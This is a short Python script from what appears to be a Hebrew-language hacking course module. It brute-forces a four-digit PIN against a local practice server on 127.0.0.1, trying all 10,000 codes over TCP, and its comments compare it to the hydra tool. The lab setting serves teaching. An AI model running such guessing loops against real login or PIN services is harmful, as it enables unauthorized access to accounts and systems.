#!/usr/bin/env python3
# =====================================================================
#  פורץ ה-PIN  —  PIN Brute Forcer  (מודול 4)
#  מנחש את כל 10,000 האפשרויות (0000–9999) מול pin_server.py,
#  עד שאחת מצליחה. זה בדיוק מה ש-hydra עושה (מודול 8) — אבל שלך!
#
#  הרץ קודם את המטרה:  python3 pin_server.py   (בטרמינל אחר)
#  ואז:                python3 brute_force.py
# =====================================================================
import socket

HOST, PORT = "127.0.0.1", 9999


def try_pin(pin: str) -> str:
    """שולח PIN אחד לשרת ומחזיר את התשובה."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((HOST, PORT))
    s.sendall(pin.encode())
    resp = s.recv(64).decode(errors="ignore").strip()
    s.close()
    return resp


def main():
    print("[*] מתחיל Brute Force על 0000–9999 ...")
    for n in range(10000):
        pin = f"{n:04d}"                 # 0 -> "0000", 42 -> "0042"
        resp = try_pin(pin)
        if resp.startswith("OK"):
            print(f"\n[+] נמצא! ה-PIN הוא: {pin}")
            print(f"[+] תשובת השרת: {resp}")
            return
        if n % 500 == 0:                 # התקדמות כל 500 נסיונות
            print(f"    ...ניסיתי עד {pin}")
    print("[!] לא נמצא (השרת רץ?)")


if __name__ == "__main__":
    main()
